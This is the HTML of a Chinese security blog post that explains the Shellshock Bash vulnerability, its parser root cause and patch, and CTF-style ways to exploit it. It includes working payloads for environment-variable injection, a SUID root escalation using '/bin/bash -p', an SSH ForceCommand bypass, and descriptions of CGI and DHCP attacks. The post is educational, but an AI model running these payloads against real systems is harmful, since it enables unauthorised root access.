@@ -1,0 +1,836 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/fy.jpg">
+  <link rel="icon" href="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/fy.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="FYHypo">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x01 简介 Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。  123#payload：env x&#x3D;&amp;#x27;() &amp;#123; :; &amp;#125;; echo shellshocked&amp;#x27; bash -c &quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellshock总结">
+<meta property="og:url" content="https://fyhypo.github.io/vuln/shellshock%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="FYHypo&#39;s blog">
+<meta property="og:description" content="0x01 简介 Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。  123#payload：env x&#x3D;&amp;#x27;() &amp;#123; :; &amp;#125;; echo shellshocked&amp;#x27; bash -c &quot;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fyhypo.github.io/img/shellshock.jpg">
+<meta property="article:published_time" content="2024-04-06T07:55:06.562Z">
+<meta property="article:modified_time" content="2024-08-31T09:38:52.416Z">
+<meta property="article:author" content="FYHypo">
+<meta property="article:tag" content="vuln">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fyhypo.github.io/img/shellshock.jpg">
+  
+  
+  
+  <title>shellshock总结 - FYHypo&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fyhypo.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>FYHypo</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/none.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="shellshock总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-04-06 15:55" pubdate>
+          2024年4月6日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">shellshock总结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><blockquote>
+<p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#payload：</span><br><span class="hljs-built_in">env</span> x=<span class="hljs-string">&#x27;() &#123; :; &#125;; echo shellshocked&#x27;</span> bash -c <span class="hljs-string">&quot;echo 1&quot;</span><br><span class="hljs-comment">#存在漏洞时输出有shellshock（注意加必要的空格）</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>漏洞核心原理：类似代码注入，父进程中的特殊变量字符串(这里指字符串内容为函数)成为环境变量后，在子进程中调用该字符串时将其理解为函数执行，本质上是bash代码本身对于处理该类环境变量时的不合理</p>
+</blockquote>
+<h2 id="0x02-前置知识-环境变量-bash"><a href="#0x02-前置知识-环境变量-bash" class="headerlink" title="0x02 (前置知识) 环境变量&amp;bash"></a>0x02 (前置知识) 环境变量&amp;bash</h2><p>1、shell变量：</p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331181204.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>子进程不继承普通shell变量</p>
+</blockquote>
+<p>2、shell环境变量：</p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331181357.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>子进程可以继承环境变量</p>
+</blockquote>
+<p>3、shell函数变量：</p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331182209.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>子进程不继承普通函数变量</p>
+</blockquote>
+<p>4、环境变量版函数变量：</p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331183038.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>子进程会继承环境变量版函数变量</p>
+</blockquote>
+<p>5、字符串版 函数环境变量（漏洞点1）</p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331185121.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>将函数声明当作字符串赋值给环境变量时，子进程会错误的把普通环境变量当作函数变量执行！</p>
+</blockquote>
+<blockquote>
+<p>对比没有漏洞的kali：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404130737.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+</blockquote>
+<p>6、字符串定义一次性版 函数环境变量：</p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404132634.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>env定义一次性环境变量，之后可加被作用的命令语句</p>
+</blockquote>
+<blockquote>
+<p>对比没有漏洞的kali：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404133435.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+</blockquote>
+<p>7、字符串定义版 函数环境变量注入：</p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404143137.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>启动bash子进程时居然执行了一次在函数定义语句后方的注入代码！<br>具体原因后文探讨</p>
+</blockquote>
+<h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><blockquote>
+<p>触发shellshcok：</p>
+<ol>
+<li>存在子进程对字符串环境变量的解析错误（解析为函数变量），得以获得有问题的函数变量</li>
+<li>bash未对函数变量做明确的界定、截取，导致结尾处代码注入（具体原因后文探讨）</li>
+</ol>
+</blockquote>
+<h2 id="0x03-漏洞成因"><a href="#0x03-漏洞成因" class="headerlink" title="0x03 漏洞成因"></a>0x03 漏洞成因</h2><h3 id="1、bash对于函数变量的解析"><a href="#1、bash对于函数变量的解析" class="headerlink" title="1、bash对于函数变量的解析"></a>1、bash对于函数变量的解析</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404144334.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>新的bash进程会重新加载环境变量，此时解析器若发现括号和花括号时就会认定它是函数定义<br>这就是子进程错把字符串形式的变量解析为函数变量的原因</p>
+</blockquote>
+<h3 id="2、尾部代码注入"><a href="#2、尾部代码注入" class="headerlink" title="2、尾部代码注入"></a>2、尾部代码注入</h3><blockquote>
+<p>关于为什么bash把函数体解析完之后会去执行后面的注入语句：</p>
+</blockquote>
+<blockquote>
+<p>有漏洞的bash的源码：</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404161022.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>简单分析源码，Bash初始化时调用了<code>builtins/evalstring.c</code>里的<code>parse_and_execute</code>函数。是的，就等于Bash初始化环境时调用了类似其他高级语言中的<code>eval</code>函数，它负责解析字符串输入并执行。但是又未对变量进行截取、过滤，导致读到后括号 } 时没有结束！</p>
+</blockquote>
+<blockquote>
+<p>其实Bash本身其实是想在启动时初始环境变量以及定义一些函数，而初始的方式就是去把 <code>变量名=值</code> 这样的赋值语句用eval去执行一次，如果出现了函数定义，就把它转变成函数，除此之外就不想让它干其他的了，可偏偏它在扫描到函数定义时，把它转变成函数的过程中不小心执行了后面的命令，这其实不是eval的错，这是做语法解析时没考虑严格，所以补丁加了这么一句话来判断函数体合法性：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> ((flags &amp;amp; SEVAL_FUNCDEF) &amp;amp;&amp;amp; command-&amp;gt;type != cm_function_def)<br></code></pre></td></tr></table></figure>
+
+
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404163420.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><blockquote>
+<p>经典payload：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> c=<span class="hljs-string">&#x27;() &#123; :;&#125;; echo 1&#x27;</span> bash -c <span class="hljs-string">&#x27;echo 2&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404182814.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404182822.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>定义一个字符串型函数环境变量，尾部注入检测点echo 1，最后启动一个新bash触发被注入代码<br>注意空格之类的细节</p>
+</blockquote>
+<h3 id="攻击suid程序本地提权"><a href="#攻击suid程序本地提权" class="headerlink" title="攻击suid程序本地提权"></a>攻击suid程序本地提权</h3><blockquote>
+<p>将system中写死命令的执行点利用shellshock进行转移外带</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405212529.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>假设现在有这样一个有s位的可执行文件，由root编译且setuid，system中的命令写死&#x2F;bin&#x2F;ls，即不能执行其他命令，且因为写死了&#x2F;bin也不能劫持ls，此时便可用shellshock转移外带出执行点！</p>
+</blockquote>
+<p>1、将&#x2F;bin&#x2F;sh软链接到存在漏洞的bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -sf /bin/bash /bin/sh<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因为system底层使用的是&#x2F;bin&#x2F;sh，并非bash<br>此时执行文件已可以启动有漏洞的bash</p>
+</blockquote>
+<p>2、导入永久型函数环境变量、执行s位文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> <span class="hljs-built_in">test</span>=<span class="hljs-string">&#x27;() &#123; :;&#125;;/bin/bash -p&#x27;</span><br>./exp<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>此时只要启动bash就会加载一次环境变量test、执行一次被注入的语句(可以是反弹shell)，从而转移出命令执行点，由于最初的触发点是root的s位，所以拿到的会是root shell</p>
+</blockquote>
+<p>注意：做题时一定注意反编译出的可执行文件有没有setuid0（设置进程uid为root），若没有就是虚假的s位文件，无法利用！（即需要同时设置文件的suid和进程的suid，才真正有root权限）</p>
+<h3 id="攻击ssh"><a href="#攻击ssh" class="headerlink" title="攻击ssh"></a>攻击ssh</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405223202.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>先来看openssh的阻止特定用户ssh登录功能：</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405223605.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i identity_file shocker@140.20.11.30<br>The authenticity of host <span class="hljs-string">&#x27;140.20.11.30 (140.20.11.30)&#x27;</span> can<span class="hljs-string">&#x27;t be established</span><br><span class="hljs-string">...</span><br><span class="hljs-string">Enter passphrase for key &#x27;</span>identity_file<span class="hljs-string">&#x27;:</span><br><span class="hljs-string">welcome</span><br><span class="hljs-string">Connection to 140.20.11.30 closed.</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>对比两种方式：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405223816.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>个人理解：forcecommand由操作系统完成，用户配置文件的command和客户端ssh链接时携带的命令属于同一类型</p>
+</blockquote>
+<p>接下来来看openssh提供的客户端可携带命令的功能：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh -i identity_file <span class="hljs-built_in">test</span>@140.20.11.30 <span class="hljs-string">&#x27;echo USER=$USER and SHELL=$SHELL&#x27;</span><br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;identity_file&#x27;</span>: <br>USER=<span class="hljs-built_in">test</span> and SHELL=/bin/bash<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>openssh允许用户在登录语句携带命令，登录成功后执行，但优先级低于两种command，即若服务端主动关闭连接就会无法执行</p>
+</blockquote>
+<p>漏洞产生：</p>
+<blockquote>
+<p>当客户端提供使用 ssh 命令运行的命令时，sshd 会将其复制到 SSH_ORIGINAL_COMMAND 变量中，但仅运行强制命令。尽管如此，由于 SSH_ORIGINAL_COMMAND 是一个<strong>环境变量</strong>，我们可以通过传递以 Bash 函数开头的命令来利用 Shellshock，这为我们提供了一种绕过施加限制的方法</p>
+</blockquote>
+<blockquote>
+<p>一句话概括：登陆语句携带的命令会寄存在这个环境变量中，此时若服务器存在bashshock，即可完成shellshock所需的环境变量注入，从而执行任意命令，如反弹shell，最后获得稳定shell</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405230723.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i identity_file shocker@140.20.11.30 <span class="hljs-string">&#x27;() &#123; :;&#125;; echo USER=$USER and SHELL=$SHELL&#x27;</span><br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;identity_file&#x27;</span>:<br>USER=shocker and SHELL=/bin/bash<br>welcome<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>例题：vulnhub的tr0ll2</p>
+</blockquote>
+<h3 id="攻击cgi程序"><a href="#攻击cgi程序" class="headerlink" title="攻击cgi程序"></a>攻击cgi程序</h3><blockquote>
+<p>前置知识：</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405231758.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>原理：</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405231901.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>利用条件：<br>1、启用cgi，且可以访问到cgi-bin下的cgi程序<br>2、bash版本存在shellshock</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240406153231.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>例题：vulnhub pwnos1</p>
+</blockquote>
+<h3 id="攻击dhcp"><a href="#攻击dhcp" class="headerlink" title="攻击dhcp"></a>攻击dhcp</h3><blockquote>
+<p>当攻击者拿下dhcp服务器时，可攻击存在shellshock的客户机，利用114号option会作为额外option注入客户端环境变量，达成对客户端的rce</p>
+</blockquote>
+<blockquote>
+<p>dhcp服务器的处理流程：</p>
+</blockquote>
+<ol>
+<li><strong>DHCP Discover和Offer</strong>：<ul>
+<li>Linux Client发送DHCP Discover报文以请求IP地址和其他网络配置信息。</li>
+<li>DHCP服务器接收到Discover报文后，根据配置构建Offer报文，并包含IP地址、子网掩码等参数，以及额外Option中的114号参数，该参数代表Url参数，后续会被添加如环境变量。</li>
+</ul>
+</li>
+<li><strong>DHCP Request和Ack</strong>：<ul>
+<li>Linux Client接收到DHCP服务器发送的Offer报文后，可能会发送DHCP Request报文以确认所提供的网络配置。</li>
+<li>DHCP服务器接收到Request报文后，如果同意提供配置，将发送DHCP Ack报文确认。</li>
+<li>Linux Client在接收到Ack报文后，将配置应用到其网络接口。</li>
+</ul>
+</li>
+<li><strong>Client调用Bash对端口以相关参数赋值</strong>：<ul>
+<li>一旦Linux Client成功获得IP地址和其他网络配置，会调用Bash脚本对网络接口进行配置，并将DHCP服务器提供的参数作为环境变量传递给该脚本，其中就包括114号参数</li>
+</ul>
+</li>
+</ol>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240406154553.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>当client请求dhcp服务器时触发shellshock反弹出客户机shell</p>
+</blockquote>
+<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><p><a target="_blank" rel="noopener" href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/">Bash 3.0-4.3命令执行漏洞分析 - 知道创宇 (knownsec.com)</a><br><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html">Shellshock漏洞回顾与分析测试 - Debug_Orz (wooyun.js.org)</a><br><a target="_blank" rel="noopener" href="https://www.zhihu.com/tardis/zm/art/35579956?source_id=1005">什么是ShellShock攻击？ (zhihu.com)</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/14248937.html">Bash 破壳漏洞Shellshock （CVE-2014-6271）复现分析 - 春告鳥 - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock（软件错误） - 维基百科，自由的百科全书 — Shellshock (software bug) - Wikipedia</a><br>[ShellShock 攻击实<a target="_blank" rel="noopener" href="https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/">Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌 | DEVCORE 戴夫寇爾</a><br><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/473063">关于ShellShock对企业网络服务器的攻击以及防范手段-阿里云开发者社区 (aliyun.com)</a><br><a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/68877/shellshock-dhcp-exploitation">bash - shellshock DHCP 漏洞利用 - 信息安全堆栈交换 — bash - shellshock dhcp exploitation - Information Security Stack Exchange</a><br><a target="_blank" rel="noopener" href="https://www.zhihu.com/tardis/zm/art/35579956?source_id=1005">https://www.zhihu.com/tardis/zm/art/35579956?source_id=1005</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/14248937.html">https://www.cnblogs.com/Cl0ud/p/14248937.html</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/21365920">https://zhuanlan.zhihu.com/p/21365920</a><br> <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">https://en.wikipedia.org/wiki/Shellshock_(software_bug)</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/279713.html">https://www.freebuf.com/articles/system/279713.html</a><br><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html">https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/vuln/" class="category-chain-item">vuln</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/vuln/" class="print-no-link">#vuln</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>shellshock总结</div>
+      <div>https://fyhypo.github.io/vuln/shellshock总结/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>FYHypo</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年4月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/HTB/HTB%20Acute/" title="HTB Acute">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Acute</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/vulnhub/vulnhub%20Kioptrix4/" title="vulhub Kioptrix4">
+                        <span class="hidden-mobile">vulhub Kioptrix4</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
